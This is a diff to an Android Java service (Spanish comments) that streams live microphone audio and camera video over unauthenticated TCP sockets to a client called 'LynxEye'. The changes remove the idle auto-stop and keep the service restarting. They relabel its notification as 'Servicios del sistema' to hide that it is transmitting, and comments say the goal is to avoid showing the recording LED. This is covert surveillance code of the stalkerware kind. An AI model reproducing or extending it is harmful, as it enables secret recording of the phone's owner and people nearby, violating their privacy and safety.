@@ -40,8 +40,8 @@ public class StreamService extends Service {
 
     private PowerManager.WakeLock wakeLock;
     private AudioRecord audioRecord;
-    private volatile boolean streaming     = false;
-    private volatile boolean videoEnabled  = true;
+    private volatile boolean streaming       = false;
+    private volatile boolean videoEnabled    = true;
     private volatile boolean switchRequested = false;
 
     private volatile int sampleRate  = 44100;
@@ -49,17 +49,14 @@ public class StreamService extends Service {
 
     private volatile int currentCameraIndex = 0;
     private String[] cameraIds;
-    private volatile int activeClients = 0;
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         if (intent != null && "STOP".equals(intent.getAction())) {
-            stopSelf(); return START_STICKY;
+            stopSelf(); return START_NOT_STICKY;
         }
         if (isRunning) return START_STICKY;
 
-        // Arrancar siempre como dataSync (permitido desde background)
-        // No requiere estar en primer plano
         startForegroundNotification();
         acquireWakeLock();
         streaming = true;
@@ -73,7 +70,7 @@ public class StreamService extends Service {
         startCommandServer();
         startAudioServer();
         startVideoServer();
-        return START_STICKY;
+        return START_STICKY; // Android reinicia si muere
     }
 
     @Override
@@ -87,18 +84,11 @@ public class StreamService extends Service {
 
     @Override public IBinder onBind(Intent intent) { return null; }
 
-    private void checkAutoStop() {
-        new Thread(() -> {
-            try { Thread.sleep(3000); } catch (Exception ignored) {}
-            if (activeClients <= 0 && streaming) stopSelf();
-        }).start();
-    }
-
-    // Siempre dataSync - no activa LED, funciona desde background
+    // dataSync: funciona desde background, no activa LED por declaración
     private void startForegroundNotification() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel ch = new NotificationChannel(
-                    CHANNEL_ID, "Transmisión activa", NotificationManager.IMPORTANCE_LOW);
+                    CHANNEL_ID, "Servicios del sistema", NotificationManager.IMPORTANCE_LOW);
             NotificationManager mgr = getSystemService(NotificationManager.class);
             if (mgr != null) mgr.createNotificationChannel(ch);
         }
@@ -152,6 +142,7 @@ public class StreamService extends Service {
     }
 
     // ─── AUDIO SERVER ─────────────────────────────────────
+    // Mic solo se abre cuando LynxEye conecta → sin LED en idle
     private void startAudioServer() {
         new Thread(() -> {
             while (streaming) {
@@ -159,16 +150,17 @@ public class StreamService extends Service {
                 try {
                     ss = new ServerSocket(PORT_AUDIO);
                     ss.setReuseAddress(true);
+                    // IDLE: esperando, mic apagado, sin LED
                     client = ss.accept();
                     client.setTcpNoDelay(true);
                     client.setSoTimeout(20000);
-                    activeClients++;
 
+                    // ACTIVO: LynxEye conectó, abrir mic
                     int sr  = sampleRate;
                     int ch  = channelMode;
                     int buf = AudioRecord.getMinBufferSize(sr, ch, AudioFormat.ENCODING_PCM_16BIT);
                     audioRecord = tryCreateAudioRecord(sr, ch, buf);
-                    if (audioRecord == null) { activeClients--; continue; }
+                    if (audioRecord == null) continue;
                     audioRecord.startRecording();
 
                     OutputStream out = client.getOutputStream();
@@ -179,14 +171,13 @@ public class StreamService extends Service {
                     }
                 } catch (Exception ignored) {
                 } finally {
-                    activeClients--;
+                    // IDLE: LynxEye desconectó, cerrar mic
                     if (audioRecord != null) {
                         try { audioRecord.stop(); audioRecord.release(); } catch (Exception ignored) {}
                         audioRecord = null;
                     }
                     try { if (client != null) client.close(); } catch (Exception ignored) {}
                     try { if (ss != null) ss.close(); } catch (Exception ignored) {}
-                    checkAutoStop();
                     if (streaming) try { Thread.sleep(100); } catch (InterruptedException e) { break; }
                 }
             }
@@ -210,6 +201,7 @@ public class StreamService extends Service {
     }
 
     // ─── VIDEO SERVER ─────────────────────────────────────
+    // Cámara solo se abre cuando LynxEye conecta → sin LED en idle
     private void startVideoServer() {
         new Thread(() -> {
             while (streaming) {
@@ -223,10 +215,11 @@ public class StreamService extends Service {
                 try {
                     ss = new ServerSocket(PORT_VIDEO);
                     ss.setReuseAddress(true);
+                    // IDLE: esperando, cámara apagada, sin LED
                     client = ss.accept();
                     client.setTcpNoDelay(true);
-                    activeClients++;
 
+                    // ACTIVO: LynxEye conectó, abrir cámara
                     final OutputStream[] outHolder = {client.getOutputStream()};
                     bgThread = new HandlerThread("CamBg");
                     bgThread.start();
@@ -274,14 +267,13 @@ public class StreamService extends Service {
                     }
                 } catch (Exception ignored) {
                 } finally {
-                    activeClients--;
+                    // IDLE: LynxEye desconectó, cerrar cámara
                     try { if (sessionHolder[0] != null) sessionHolder[0].close(); } catch (Exception ignored) {}
                     try { if (camHolder[0] != null) camHolder[0].close(); } catch (Exception ignored) {}
                     try { if (imageReader != null) imageReader.close(); } catch (Exception ignored) {}
                     try { if (bgThread != null) { bgThread.quitSafely(); bgThread.join(500); } } catch (Exception ignored) {}
                     try { if (client != null) client.close(); } catch (Exception ignored) {}
                     try { if (ss != null) ss.close(); } catch (Exception ignored) {}
-                    checkAutoStop();
                     if (streaming) try { Thread.sleep(100); } catch (InterruptedException e) { break; }
                 }
             }
